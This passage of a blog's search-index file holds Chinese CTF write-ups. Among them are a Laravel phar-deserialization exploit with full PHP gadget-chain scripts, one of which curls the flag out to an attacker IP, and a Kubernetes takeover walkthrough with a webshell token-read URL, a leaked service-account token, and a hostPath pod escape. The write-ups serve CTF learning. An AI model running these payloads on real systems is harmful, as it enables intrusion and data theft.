\"attributes\")) &#123;\n        if (true) &#123;\n            attrcharsadded += _0x8a010b[\"attributeName\"][\"length\"];\n        &#125;\n    &#125;\n&#125;\n\n在这里学习了一下 MutationRecord 的函数，MutationRecord JavaScript API。 type 会随着不同的操作改变\n\n改变 Node.childNodes 时会变成 childList\n改变 Element.attribute 时会变成 attributes\n\n按要求我们需要5次节点增加，3次节点移除，改变的属性名的长度总和为23。\n需要注意的是，在这段赋值操作前，有一处判断会导致程序提前退出。\nvar _0x5b12b9 = document[\"getElementById\"](\"3fa\");\n...\nif ((_0x8a010b[\"target\"] === _0x5b12b9) || \\\n_0x8a010b[\"target\"][\"parentNode\"] === _0x5b12b9 || \\\n_0x8a010b[\"target\"][\"parentNode\"][\"parentNode\"] === _0x5b12b9) &#123;&#125;\nelse return;\n\n所以 id 为 #3fa 的节点必须是根节点（可以直接给 &lt;html&gt; ）。\n接下来在调试的时候观察到 domvalue 与 .html 文件中的字数有关，凑足一定的字数即可。\n&lt;input id=\"thirdfactooor\" size=\"1000px\">\n&lt;script>\n    let fa = document.getElementsByTagName(\"html\")[0];\n    fa.setAttribute(\"id\", \"3fa\")\n    for(let i = 0; i &lt; 4; i++) &#123;\n        fa.lang = i; // 2 + 4 chars * 4 + 5\n    &#125;\n    let a = document.createElement(\"div\")\n    let b = document.createElement(\"div\")\n    let c = document.createElement(\"div\")\n    let d = document.createElement(\"div\")\n    let e = document.createElement(\"div\")\n    fa.appendChild(a)\n    fa.appendChild(b)\n    fa.appendChild(c)\n    fa.appendChild(d)\n    fa.appendChild(e)\n    fa.removeChild(a)\n    fa.removeChild(b)\n    fa.removeChild(c);\n    console.log(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\")\n&lt;/script>\n\n直接放在本地跑，成功\n\nCapture the flag远程服务提供了一个 /submit 接口，可以提交我们的 html 文件，然后会用类似给这个 html “拍照”的方式，以图片格式返回。期间， html 文件里的 js 代码都会执行，但是 alert() 会引起报错，基本排除了 XSS 的可能。直接上传，DONE!\n\n\n","categories":[],"tags":["CTF WriteUp"]},{"title":"HFCTF2021 TinyPNG 复现","url":"/20210429/HFCTF2021-TinyPNG/","content":"HFCTF2021 TinyPNG感谢 Naivekun 师傅的帮助\n因为题目没有给全环境，所以自己 docker 搭了个环境，和 Buu 上的好像不太一样\ndocker 环境我会放在我的 GitHub 上，复现环境\n2021-05-18 更新：更新的部分，往下到结尾。\nZeddYu 师傅说将 HTTP2 走私的环境放到 GitHub 上了，H2走私环境\n阅读源码先阅读源码，搞清楚这个 Web 应用的具体功能和流程\nLaravel 框架的默认路由位于 routes/web.php 下 \n&lt;?php\n//...    \n\nRoute::get('/', function () &#123;\n    return view('upload');\n&#125;);\nRoute::post('/', [IndexController::class, 'fileUpload'])->name('file.upload.post');\n\n//Don't expose the /image to others!\nRoute::get('/image', [ImageController::class, 'handle'])->name('image.handle');\n\n所以很容易得到这个应用有三条路由\n第一条路由是返回 upload 页面，视图文件位于 resources/views/*\n其他两条路由，分别看他们对应的类和方法，位于 app/Http/Controllers/*\n# app/Http/Controllers/IndexController.php\n\n&lt;?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\n\nclass IndexController extends Controller\n&#123;\n    public function fileUpload(Request $req)\n    &#123;\n        $allowed_extension = \"png\";\n        $extension = $req->file('file')->clientExtension();\n        if($extension === $allowed_extension &amp;&amp; $req->file('file')->getSize() &lt; 204800)\n        &#123;\n            $content = $req->file('file')->get();\n            if (preg_match(\"/&lt;\\?|php|HALT\\_COMPILER/i\", $content ))&#123;\n                $error = 'Don\\'t do that, please';\n                return back()\n                    ->withErrors($error);\n            &#125;else &#123;\n                $fileName = \\md5(time()) . '.png';\n                $path = $req->file('file')->storePubliclyAs('uploads', $fileName);\n                echo \"path: $path\";\n                return back()\n                    ->with('success', 'File has been uploaded.')\n                    ->with('file', $path);\n            &#125;\n        &#125; else&#123;\n            $error = 'Don\\'t do that, please';\n            return back()\n                ->withErrors($error);\n        &#125;\n\n\n    &#125;\n&#125;\n\nIndexController 的 fileUpload 方法实现了一个文件上传的功能\n\n上传的文件后缀名只能以 .png 结尾\n\n上传的文件会被存储在 public/uploads文件夹内，文件名不可控，为 \\md5(time()) . &#39;.png&#39;\n\n对 &lt;?、php、HALT_COMPILER 字符串进行了过滤\n\n上传成功后会返回储存的路径\n\n\n# app/Http/Controllers/ImageController.php\n\n&lt;?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\n\nclass ImageController extends Controller\n&#123;\n    public function handle(Request $request)\n    &#123;\n        $source = $request->input('image');\n        if(empty($source))&#123;\n            return view('image');\n        &#125;\n        $temp = explode(\".\", $source);\n        $extension = end($temp);\n        if ($extension !== 'png') &#123;\n            $error = 'Don\\'t do that, pvlease';\n            return back()\n                ->withErrors($error);\n        &#125; else &#123;\n            $image_name = md5(time()) . '.png';\n            $dst_img = '/var/www/html/' . $image_name;\n            $percent = 1;\n            (new imgcompress($source, $percent))->compressImg($dst_img);\n            return back()->with('image_name', $image_name);\n        &#125;\n    &#125;\n&#125;\n\nImageController 的 handle 方法实现了一个压缩图片的功能\n\n实现了，但又没有完全实现\n读取 Request 中传入的 image 作为目标图片路径\n读取该图片，调用 imgcompress 类中的 compressImg 方法对图片进行压缩\n压缩完成后返回图片的路径\n\n在来看看调用的 imgcompress 类，因为比较长，所以截取关键部分贴上来\n# app/Http/Controllers/imgcompress.php\n\n&lt;?php\n\nclass imgcompress\n&#123;\n\t//...\n    \n\t/**\n     * 内部：打开图片\n     */\n    private function _openImage()\n    &#123;\n        list($width, $height, $type, $attr) = getimagesize($this->src);\n        $this->imageinfo = array(\n            'width' => $width,\n            'height' => $height,\n            'type' => image_type_to_extension($type, false),\n            'attr' => $attr\n        );\n        $fun = \"imagecreatefrom\" . $this->imageinfo['type'];\n        $this->image = $fun($this->src);\n        $this->_thumpImage();\n    &#125;\n    \n    //...\n&#125;\n\n在 _openImage 方法中，getimagesize 函数会打开一个文件\n而且在 PHP 4.0.5 支持后支持通过 URL 打开\n\n于是这里我们就可以夹带私货了，比如说 phar://\n修洞先看路由 routes/web.php\nRoute::get('/', function () &#123;\n    return view('upload');\n&#125;);\nRoute::post('/', [IndexController::class, 'fileUpload'])->name('file.upload.post');\n\n//Don't expose the /image to others!\nRoute::get('/image', [ImageController::class, 'handle'])->name('image.handle');\n\n可以看到 //Don&#39;t expose the /image to others!\n所以修洞很简单，直接注释掉/image路由即可\n打洞题目给了Apache的配置文件，开启了目录重写\n所以访问/index.php/image即可访问到/image路由\n我一开始看这个题目配了 HTTPS，想起来 4qE 比赛之前给我发的那篇推文，以为要打一个走私。结果是这样就绕过了。\n然后这一题可以上传文件，可以读取文件，打一个 phar 反序列化\n参考文章：一道CTF题引起的对laravel v8.32.1序列化利用链挖掘\n题目环境里给出了 Laravel 的版本\n\"require\": &#123;\n        \"php\": \"^7.3|^8.0\",\n        \"fideloper/proxy\": \"^4.4\",\n        \"fruitcake/laravel-cors\": \"^2.0\",\n        \"guzzlehttp/guzzle\": \"^7.0.1\",\n        \"laravel/framework\": \"^8.12\",\n        \"laravel/tinker\": \"^2.5\"\n    &#125;,\n\n所以照文章找一条链下来是个不错的选择\nImportConfigurator 类第一个是 Symfony\\Component\\Routing\\Loader\\Configurator 中的类 ImportConfigurator\n该类存在一个包含了语句 $this-&gt;xxx-&gt;xxx() 的 __destruct 方法\n这样我们可以控制 $this-&gt;xxx，从而执行一些预期之外的方法\n# vendor/symfony/routing/Loader/Configurator/ImportConfigurator.php\n\nclass ImportConfigurator\n&#123;\n    private $parent;\n    //...\n    public function __destruct()\n        &#123;\n            $this->parent->addCollection($this->route);\n        &#125;\n    //...\n&#125;\n\n因为函数名不可控，找一个有 __call 方法的类\n比如说 Faker 中的类 ValidGenerator\nValidGenerator 类# vendor/fakephp/faker/src/Faker/ValidGenerator.php\n\nclass ValidGenerator\n&#123;\n    protected $generator;\n    protected $validator;\n    protected $maxRetries;\n    //...\n    public function __call($name, $arguments)\n        &#123;\n            $i = 0;\n            do &#123;\n                $res = call_user_func_array([$this->generator, $name], $arguments);\n                $i++;\n                if ($i > $this->maxRetries) &#123;\n                    throw new \\OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));\n                &#125;\n            &#125; while (!call_user_func($this->validator, $res));\n\n            return $res;\n        &#125;\n    //...\n&#125;\n\n选用这个类是因为这个 __call 方法中包含了清晰可见的 call_user_func_array 和 call_user_func\n可以发现 call_user_func 的参数 $this-&gt;validator 是可控的\n而另一个参数 $res 是从 call_user_func_array 函数中获得的返回值\ncall_user_func_array 的参数中，$this-&gt;generator 是可控的\n但我们无法控制他的返回值，即无法控制 $res\n另一个参数 $name 是不可控的，且值为 addCollection\n另外我们为了触发一次 call_user_func，这里选择将 $this-&gt;MaxRetries 置为 1 即可\n\nDefaultGenerator 类我们再看到 Faker 中的类 DefaultGenerator\n# vendor/fakephp/faker/src/Faker/DefaultGenerator.php\n\nclass DefaultGenerator\n&#123;\n    protected $default;\n\t//...\n\tpublic function __call($method, $attributes)\n    \t&#123;\n        \treturn $this->default;\n    \t&#125;\n    //...\n&#125;\n\n这里的 __call 方法会返回一个我们完全可控的 $this-&gt;default\n于是到这里，ValidGenerator 中的 $res 参数就是我们可以控制的了\n调用链梳理一下调用链\n&lt;?php\n\nclass ImportConfigurator\n&#123;\n    public function __destruct()\n    &#123;\n        $this->parent->addCollection($this->route);\n    &#125;\n&#125;\n\nclass ValidGenerator\n&#123;\n    public function __call($name, $arguments)\n    &#123;\n        $i = 0;\n        do &#123;\n            $res = call_user_func_array([$this->generator, $name], $arguments);\n            $i++;\n            if ($i > $this->maxRetries) &#123;\n                throw new \\OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));\n            &#125;\n        &#125; while (!call_user_func($this->validator, $res));\n\n        return $res;\n    &#125;\n&#125;\n\nclass DefaultGenerator\n&#123;\n    public function __call($method, $attributes)\n        &#123;\n            return $this->default;\n        &#125;\n&#125;\n\n1、通过 ImportConfigurator 类的 __destruct 方法触发 ValidGenerator 类的 __call 方法\n2、ValidGenerator 类的 __call 方法中的 call_user_func_array 函数\n3、触发 DefaultGenerator 类的 __call 方法\n4、DefaultGenerator 类的 __call 方法返回值完全可控\n5、ValidGenerator 类的 __call 方法中的 call_user_func_array 函数返回值 $res 可控\n6、ValidGenerator 类的 __call 方法中 call_user_func 函数的两个参数都可控\n条件梳理\n\nImportConfigurator-&gt;parent = ValidGenerator 类\nValidGenerator-&gt;maxRetries = 1\nValidGenerator-&gt;generator = DefaultGenerator 类\nDefaultGenerator-&gt;default = [任意可控函数参数]\nValidGenerator-&gt;validator = [任意可控函数名称]\n\nphar 反序列化phar 反序列化是 BlackHat 2018 公布的一种不需要 unserialize 函数就能触发反序列化的方法\n因为百度出来的复制来复制去都是那几篇文章，这里附一份 BlackHat 2018 的讲义\nPHAR 文件是 PHP Archieve 的缩写，也就是类似于 Java 的 JAR 包的一种压缩文件\n\nPHP 在读取 PHAR 文件的时候会对 .phar/.metadata.bin 中的内容进行反序列化\n# exp1.phar.tar.gz/.phar/.metadata.bin\n\nO:64:\"Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator\":1:&#123;s:72:\" Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator parent\";O:20:\"Faker\\ValidGenerator\":3:&#123;s:12:\" * generator\";O:22:\"Faker\\DefaultGenerator\":1:&#123;s:10:\" * default\";s:34:\"echo \"&lt;?php phpinfo(); ?>\" > 1.php\";&#125;s:12:\" * validator\";s:6:\"system\";s:13:\" * maxRetries\";i:1;&#125;&#125;\n\n而 .phar/stub.php 是 PHAR 文件的一个标志，即 __HALT_COMPILER(); ?&gt;\n\nPHP 不会理会这个标志前面是什么东西，他只管把这个标志后面的部分作为 PHAR 包来解析\ntest.txt 是随便一个什么东西，是一个为了完成压缩而随意构造的东西，PHAR 反序列化的重点也不在这里 2333\n因此只要 PHP 能以 phar:// 协议读取这个文件，我们的目的就达到了\nEXP&lt;?php\n\nnamespace Symfony\\Component\\Routing\\Loader\\Configurator&#123;\n    class ImportConfigurator&#123;\n        private $parent;\n        function __construct($c1)&#123;\n            $this->parent = $c1;\n        &#125;\n    &#125;\n&#125;\nnamespace Faker&#123;\n    class DefaultGenerator&#123;\n        protected $default;\n        function __construct($param)&#123;\n            $this->default = $param;\n        &#125;\n    &#125;\n    class ValidGenerator&#123;\n        protected $generator;\n        protected $validator;\n        protected $maxRetries;\n        function __construct($func,$param)&#123;\n            $this->generator = new DefaultGenerator($param);\n            $this->maxRetries = 1;\n            $this->validator = $func;\n        &#125;\n    &#125;\n&#125;\nnamespace&#123;\n    $phar = new Phar('exp1.phar');\n    \n    $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ);\n    \n    $phar->startBuffering();\n    $phar->setStub('&lt;?php __HALT_COMPILER();?>');\n    $phar->addFromString('test.txt', 'test');\n    $o = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator(\n        new Faker\\ValidGenerator('system','echo \"&lt;?php phpinfo(); ?>\" > 1.php')\n    );\n    $phar->setMetadata($o);\n    $phar->stopBuffering();\n    echo serialize($o);\n&#125;\n\n因为上传文件有对 stub 和 php 的过滤，加一行语句压缩一下就能过\n压缩后的文件内容\n\n足够抽象了吧 233\n生成出来的 exp1.phar.tar.gz，改名为 exp1.png\nP.S. 因为 PHP 8 在遇到异常的时候会作为错误处理，停止执行代码\n所以如果题目环境是 PHP 8 好像是打不通的 (我是 Manjaro 神教，被坑了不短时间 2333)\n\n上传文件，然后访问路由 /index.php/image?image=phar://./uploads/xxxxxxx.png\n\n\n会返回 500 错误，我开了 Laravel DEBUG 所以页面上有详细信息\n但是 phar 反序列化已经执行了，所以会在 public 目录生成一个 1.php\n\n访问 /1.php 即可\n官方版本 EXP参考了 ZeddYu 师傅的推文。\n本地环境和 Buu 远程环境不太一样，我的 EXP 好像没打通，官方解用了另一条链。\n有兴趣的师傅可以跟一下这条链。\n&lt;?php\n\nnamespace Illuminate\\Bus &#123;\n    class Dispatcher\n    &#123;\n        protected $queueResolver;\n\n        function __construct()\n        &#123;\n            $this->queueResolver = [new \\Mockery\\Loader\\EvalLoader(), 'load'];\n        &#125;\n    &#125;\n&#125;\n\nnamespace Illuminate\\Broadcasting &#123;\n    class PendingBroadcast\n    &#123;\n        protected $events;\n        protected $event;\n\n        function __construct($evilCode)\n        &#123;\n            $this->events = new \\Illuminate\\Bus\\Dispatcher();\n            $this->event = new BroadcastEvent($evilCode);\n        &#125;\n    &#125;\n\n    class BroadcastEvent\n    &#123;\n        public $connection;\n\n        function __construct($evilCode)\n        &#123;\n            $this->connection = new \\Mockery\\Generator\\MockDefinition($evilCode);\n        &#125;\n\n    &#125;\n&#125;\n\nnamespace Illuminate\\Support &#123;\n    class MessageBag\n    &#123;\n        protected $messages = [];\n        protected $format;\n\n        function __construct($inner)\n        &#123;\n            $this->format = $inner;\n        &#125;\n    &#125;\n&#125;\n\nnamespace Mockery\\Loader &#123;\n    class EvalLoader\n    &#123;\n    &#125;\n&#125;\n\nnamespace Mockery\\Generator &#123;\n    class MockDefinition\n    &#123;\n        protected $config;\n        protected $code;\n\n        function __construct($evilCode)\n        &#123;\n            $this->code = $evilCode;\n            $this->config = new MockConfiguration();\n        &#125;\n    &#125;\n\n    class MockConfiguration\n    &#123;\n        protected $name = 'abcdefg';\n    &#125;\n&#125;\n\nnamespace &#123;\n    $code = '&lt;?php $s=base64_encode(file_get_contents(\"/flag\"));system(\"curl http://xx.xx.xx.xx:5555/?a=\".$s);exit; ?>';\n    $expected = new \\Illuminate\\Broadcasting\\PendingBroadcast($code);\n    $res = new \\Illuminate\\Support\\MessageBag($expected);\n\n    @unlink(\"exp2.phar.tar.gz\");\n    $phar = new Phar(\"exp2.phar\");\n    $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ);\n    $phar->startBuffering();\n    $phar->setStub(\"GIF89a&lt;?php __HALT_COMPILER();?>\");\n    $phar->setMetadata($res);\n    $phar->addFromString(\"test.txt\", \"test\");\n    $phar->stopBuffering();\n    echo serialize($res);\n&#125;\n\nHTTP2 走私原来 /index.php/image 真的是非预期。\nZeddYu 师傅的推文里有提到 HTTP2 走私才是预期解。\n我这里贴一下 4qE 发给我的文章：BlackHat：HTTP 请求走私的新变体、新防御\n等我把走私复现了再更新博客 233\n","categories":[],"tags":["CTF WriteUp"]},{"title":"华为云 CTF cloud 非预期解之 k8s 渗透实战","url":"/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/","content":"前言转载自 Annevi\n当时打比赛的时候觉得这是个很有意思的过程\n转载记录一下\n0x00 题目入口发现拿到题目发现是一个类似于提供IaaS服务的站点，扫描了一波目录，发现几个文件以及路由:\nphpinfo.php\nrobots.txt\nadmin&#x2F;\nlogin&#x2F;\nstatic&#x2F;\n\n挺奇怪的是，在一个存在phpinfo的环境下发现了一个beego框架后端的403界面：\n\n初步猜测是.php的文件交给了nginx fastcgi进行处理，而其他路由则是交给了beego进行处理。\n接着我们先看/admin路由，发现存在一个隐藏的表单\n\n因此自然的想到使用burpsuite进行弱口令的爆破，发现存在弱口令 admin:admin\n登录成功后返回了两个url， 下载 tools.zip，同时根据名字猜测/wsproxy是一个websocket的代理路由，而查看tools的源码发现是一个wsproxy的客户端程序。\n\n至此，我们找到了进入内网的通道。\n0x01 wsproxy 进入内网直接对拿到的tools源码进行编译，获得客户端连接程序\n\n根据使用说明，我们可以通过简单的命令连接上题目的wsproxy,同时密码为tools源码目录下的 pass.txt(UAF)，session就是我们登陆admin后，题目给的beego session\n\n这样会在本地的1080端口开启一个 socks5 代理，通过这个代理，我们就能够连入内网。\n0x02 phpinfo泄露k8s集群信息由于这道题目的名称 Cloud以及在phpinfo.php 环境变量 中发现的大量service的信息以及k8s api-server地址，同时根据环境变量的名称与值来看，这是一个k8s集群。而我们的题目属于k8s集群中的一个pod。\n\n0x03 k8s基础架构介绍在继续深入下去之前，我们需要了解k8s的一些基础架构\n\n如上图所示，我们可以看到，Kubernetes集群主要分为 Master和Node 两部分，也是典型的分布式架构。\n首先，外部应用程序通过Api-Server提供的 HTTP 接口与Master进行交互，而在与APIs进行交互前，需要经过一步认证的阶段。而 Node由多个pod组成，pod中运行着的便是大家比较熟悉的容器(通常来说是docker)，编写的服务(app)就运行在这些pod中的容器内。\n其次，我们若是想将我们的pod发布出去，使其能够被公开访问，就需要了解服务(Service)。我们将运行在一组 Pods 上的应用程序公开为网络服务的抽象方法称作服务，服务上一般配置了能够被公开访问的 ip地址、端口映射关系等，通过服务我们就能够访问到相应的pods。\n每一个Node上都有一个被称作节点代理的程序 kubelet，Node通过该程序向Api-Server汇报节点信息，以及接受相应的指令等。\n从上面的架构中不难看出，如果我们要拿下整个集群，从外部看实际上就是需要获得暴露在外的api-server提供的REST api的访问权限。\n0x04 k8s 认证 token 泄露 + 配置不当通过上面一步浅显的解了一下k8s的基础架构，我们可以继续往下看。\n我们通过给的代理程序连接内网，访问phpinfo中泄露的 k8s api-server https://10.247.0.1:443，发现api-server居然暴露在代理能够直接访问到的网段上，但是直接访问提示我们401未授权，因此我们需要寻找一种可能的方式去通过此认证。\n\n根据phpinfo.php文件中的内容来看，该集群中部署了很多很多的services，因此我们猜测所有的题目容器应该都是通过这个k8s进行编排管理的。\n同时由于k8s集群部署的时候默认会在每个pod容器中挂载token文件到/run/secrets/kubernetes.io/serviceaccount/token文件中，因此我们是可以通过其他题目所拿到的shell拿到这个token。\n\nServiceAccount 主要包含了三个内容：namespace、Token 和 CA。namespace 指定了 pod 所在的 namespace，CA 用于验证 apiserver 的证书，token 用作身份验证。它们都通过 mount 的方式保存在 pod 的文件系统中，其中 token 保存的路径是 /var/run/secrets/kubernetes.io/serviceaccount/token ，是 apiserver 通过私钥签发 token 的 base64 编码后的结果\n\n我们可以通过之前在 webshell_1题目所拿到的webshell，获取到api-server认证token\nhttp:&#x2F;&#x2F;124.70.199.12:32003&#x2F;upload&#x2F;71a6e9b8-90b6-4d4f-9acd-bd91c8bbcc5e.jsp?pwd&#x3D;023&amp;i&#x3D;cat%20&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token\n\n\n至此，我们已经获得了api-server的访问权限，因此就相当于我们获取了k8s集群中的master权限。\n0x05 获取集群操纵权限拿到了api-server的权限，我们就能够随心所欲的在集群中做想做的事了~ 其实做到这一步，大概就意识到这应该是一个平台漏洞，而不是本题的预期解法。因为拿到了master权限之后，我们已经能够查看/控制所有的Pods(web题目)，随意的获取我们想要题目的flag。\n我们可以通过命令行工具 kubectl来对api-server进行操作。\n创建一个k8s.yaml配置文件，如下，token处为我们上面拿到的token，server则填写 api-server的地址\napiVersion: v1\nclusters:\n- cluster:\n    insecure-skip-tls-verify: true\n    server: https:&#x2F;&#x2F;10.247.0.1\n  name: cluster-name\ncontexts:\n- context:\n    cluster: cluster-name\n    namespace: test\n    user: admin\n  name: admin\ncurrent-context: admin\nkind: Config\npreferences: &#123;&#125;\nusers:\n- name: admin\n  user:\n    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w\n\n在本机通过题目的内网代理 执行以下命令远程连接进入题目的k8s集群，成功通过认证。\nkubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true\n\n\n至此，我们得到了访问k8s api-server的权限，下面我们尝试去获取集群master宿主机的权限。\n通过执行\nkubectl --kubeconfig k8s.yaml version --insecure-skip-tls-verify&#x3D;true\n\n\n可以看到，k8s的版本号为 v1.15.11，这个版本的k8s授权默认是不会开启RBAC(基于角色的访问控制)的。\n\n在Kubernetes中，授权有ABAC（基于属性的访问控制）、RBAC（基于角色的访问控制）、Webhook、Node、AlwaysDeny（一直拒绝）和AlwaysAllow（一直允许）这6种模式。从1.6版本起，Kubernetes 默认启用RBAC访问控制策略。从1.8开始，RBAC已作为稳定的功能。\n\n因此如果运维在搭建集群环境的时候，没有设置 --authorization-mode=RBAC ，那么我们就可以通过拿下集群中的一个pod的shell，从而获取到token进行api-server的认证。很显然，经过上面的验证，运维在部署环境时并没有开启该访问控制。\n0x06 获取master 宿主机权限我们可以创建一个新的pod，通过文件挂载的方式，将宿主机根目录的所有文件挂载到pod中，但是由于创建pod时，需要从远程地址上拉取镜像，而该题内网貌似是无法出网的，因此我们需要找一个已经拉取下来的本地镜像文件。\n执行以下命令，获取当前已经拉取过的images:\nkubectl --kubeconfig k8s.yaml get pods --all-namespaces --insecure-skip-tls-verify&#x3D;true -o jsonpath&#x3D;&quot;&#123;..image&#125;&quot; |\\\ntr -s &#39;[[:space:]]&#39; &#39;\\n&#39; |\\\nsort |\\\nuniq -c\n\n结果如下：\n\n尝试几个镜像后，发现 100.125.4.222:20202/hwofficial/coredns:1.15.6是可以使用的\nyaml配置如下：\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test-444\nspec:\n  containers:\n  - name: test-444\n    image: 100.125.4.222:20202&#x2F;hwofficial&#x2F;coredns:1.15.6\n    volumeMounts:\n    - name: host\n      mountPath: &#x2F;host\n  volumes:\n  - name: host\n    hostPath:\n      path: &#x2F;\n      type: Directory\n\n上述配置将宿主机的根目录挂载到了我们pod中的 /host目录，执行以下命令在default命名空间中创建该pod\nkubectl --kubeconfig k8s.yaml apply -f pod.yaml -n default --insecure-skip-tls-verify&#x3D;true\n\n再通过kubectl exec 进入我们的pod中，以实现对宿主机文件的控制。\nkubectl --kubeconfig k8s.yaml exec -it test-444 bash -n default --insecure-skip-tls-verify&#x3D;true\n\n至此，我们所获得的权限其实已经和主办方运维同样高了。。\n0x07 获取flag通过以上的步骤，大概明白了这是一个非预期，平台配置token的泄露外加没有开启RBAC授权，导致我们轻易的就能够获取到了k8s集群的最高权限。因此我们也就获得了该集群中所有题目容器的最高权限。\n在整个集群中，我们需要寻找属于我们队伍的pod，以便获得对应的flag。\n因此我们首先通过查询在k8s中用于服务暴露的service信息：\nkubectl --kubeconfig k8s.yaml get services -n default --insecure-skip-tls-verify&#x3D;true\n\n\n可以看到，列出了所有的service，同时还有集群ip以及端口映射的关系。这里我们就可以通过暴露在公网上的端口，来定位对应的service。\n例如我们的公网端口为30067，则我们搜索30067端口\n\n得到了我们题目pod所在的service，接着我们获取这个service的详细信息，以便得到pod name，命令如下：\nkubectl --kubeconfig k8s.yaml describe service guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true\n\n\n从这里大致可以看出，app名为guosai-34-15，因此我们相应的去所有的pod中寻找名为这一项的pod。\nkubectl --kubeconfig k8s.yaml describe pods guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true\n\n通过对我们获取的数据的检索，发现了这样一个pod，通过比较虚拟ip与phpinfo中的信息，可以确定这个pod就是我们要找的那个。\n\n因此便得到了属于我们的pod。exec进入pod后，便可以得到flag。\n0x08 总结在拿下master之后，我们立即联系了赛事主办方，经过确认这是一个平台的严重安全漏洞~也得到了主办方的感谢。\n\n\n\n之前学习云原生架构和安全相关知识的时候，一直找不到一个很好的实践方式，而这次华为云专场比赛CLOUD第一次让我接触到了真正的☁️云环境下的安全问题，虽说是通过非预期的方式解出了题目，不过这个非预期却让我们较为容易的拿到了整个集群的最高权限，还是挺意外的。\n","categories":[],"tags":["CTF WriteUp"]},{"title":"Hello World","url":"/20201001/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":[],"tags":[]}]